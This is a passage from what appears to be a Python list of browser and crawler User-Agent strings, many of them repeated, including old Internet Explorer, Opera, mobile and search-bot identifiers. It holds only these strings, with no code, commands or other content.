               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
               'Mozilla/5.0 (PLAYSTATION 3; 3.55)', 'Mozilla/5.0 (PLAYSTATION 3; 2.00)',
               'Mozilla/5.0 (PLAYSTATION 3; 1.00)',
               'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0',
               'Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)',
               'SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Googlebot/2.1 (http://www.googlebot.com/bot.html)', 'Opera/9.20 (Windows NT 6.0; U; en)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
               'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
               'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
               'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
               'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)',
               'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com',
               'Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)',
               'Mozilla/4.0 (compatible; Arachmo)', 'Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)',
               'BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)',
               'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
               'Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)',
               'Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)',
